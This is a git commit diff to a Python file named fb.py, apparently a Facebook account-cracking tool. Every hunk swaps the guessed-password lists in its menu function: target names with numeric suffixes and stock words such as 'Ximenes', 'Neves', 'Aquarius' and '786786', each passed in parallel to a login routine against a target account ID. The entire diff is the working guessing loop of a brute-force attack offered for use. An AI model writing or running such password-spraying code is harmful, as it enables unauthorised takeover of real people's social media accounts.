4d3de152415aa0aabec59c921d9bba8c53b76fe5
redrigodaos <72077561+redrigodaos@users.noreply.github.com>
2021-07-26 16:33:56 +0700

    Update fb.py

--- fb.py
+++ fb.py
@@ -215,15 +215,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '05',
-                         str(x) + '06',
-                         str(x) + '07',
-                         str(x) + '08'
+                         str(x) + '90',
+                         str(x) + '91',
+                         str(x) + '92',
+                         str(x) + '93'
                          ]
-                    litpas.append('Perreira')
-                    litpas.append('Dejesus')
-                    litpas.append('Virgo')
-                    litpas.append('virgo')
+                    litpas.append('ximenes')
+                    litpas.append('Ximenes')
+                    litpas.append('Neves')
+                    litpas.append('Aquarius')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -249,15 +249,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '05',
-                         str(x) + '06',
-                         str(x) + '07',
-                         str(x) + '08'
+                         str(x) + '90',
+                         str(x) + '91',
+                         str(x) + '92',
+                         str(x) + '93'
                          ]
-                    litpas.append('Perreira')
-                    litpas.append('Dejesus')
-                    litpas.append('Virgo')
-                    litpas.append('virgo')
+                    litpas.append('ximenes')
+                    litpas.append('Ximenes')
+                    litpas.append('Neves')
+                    litpas.append('Aquarius')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -281,15 +281,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '05',
-                           str(x) + '06',
-                           str(x) + '07',
-                           str(x) + '08'
+                           str(x) + '909090',
+                           str(x) + '919191',
+                           str(x) + '929292',
+                           str(x) + '939393'
                            ]
-                      litpas.append('Perreira')
-                      litpas.append('Dejesus')
-                      litpas.append('Virgo')
-                      litpas.append('virgo')
+                      litpas.append('ximenesximenesximenes')
+                      litpas.append('XimenesXimenesXimenes')
+                      litpas.append('NevesNevesNeves')
+                      litpas.append('AquariusAquariusAquarius')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -306,15 +306,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '05',
-                           str(x) + '06',
-                           str(x) + '07',
-                           str(x) + '08'
+                           str(x) + '9090',
+                           str(x) + '9191',
+                           str(x) + '9292',
+                           str(x) + '9393'
                            ]
-                      litpas.append('Perreira')
-                      litpas.append('Dejesus')
-                      litpas.append('Virgo')
-                      litpas.append('virgo')
+                      litpas.append('ximenesximenes')
+                      litpas.append('XimenesXimenes')
+                      litpas.append('NevesNeves')
+                      litpas.append('AquariusAquarius')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -331,15 +331,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '05',
-                           str(x) + '06',
-                           str(x) + '07',
-                           str(x) + '08'
+                           str(x) + '90',
+                           str(x) + '91',
+                           str(x) + '92',
+                           str(x) + '93'
                            ]
-                      litpas.append('Perreira')
-                      litpas.append('Dejesus')
-                      litpas.append('Virgo')
-                      litpas.append('virgo')
+                      litpas.append('ximenes')
+                      litpas.append('Ximenes')
+                      litpas.append('Neves')
+                      litpas.append('Aquarius')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -355,15 +355,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '05',
-                           str(x) + '06',
-                           str(x) + '07',
-                           str(x) + '08'
+                           str(x) + '90',
+                           str(x) + '91',
+                           str(x) + '92',
+                           str(x) + '93'
                            ]
-                      litpas.append('Perreira')
-                      litpas.append('Dejesus')
-                      litpas.append('Virgo')
-                      litpas.append('virgo')
+                      litpas.append('ximenes')
+                      litpas.append('Ximenes')
+                      litpas.append('Neves')
+                      litpas.append('Aquarius')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
